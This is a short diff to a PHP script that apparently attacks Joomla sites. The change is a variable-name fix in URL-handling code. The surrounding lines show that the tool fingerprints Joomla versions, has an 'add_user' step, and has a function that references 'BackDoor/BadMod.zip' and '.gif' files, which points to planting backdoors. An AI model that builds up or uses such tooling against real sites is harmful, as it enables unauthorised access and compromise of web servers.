@@ -1831,8 +1831,8 @@ if(preg_match("/Linux/",$op_system)){
 	$orange = "";
 	$red    = "";
 }
-if(!preg_match("/http/",$target)){
-$target = "http://".$target;	
+if(!preg_match("/http/",$url)){
+$url = "http://".$url;	
 }
 $url = $url."/language/en-GB/en-GB.xml";
 $source = @file_get_contents("$url");
@@ -2404,8 +2404,8 @@ echo $red. "  [add_user] ====> ".$orange."Failed"." \n";
 	}
 
 function joom_down($url){
-if(!preg_match("/http/",$target)){
-$target = "http://".$target;	
+if(!preg_match("/http/",$url)){
+$url = "http://".$url;	
 }
      $file1='BackDoor/BadMod.zip';
      $file2='BackDoor/BadMod.gif';
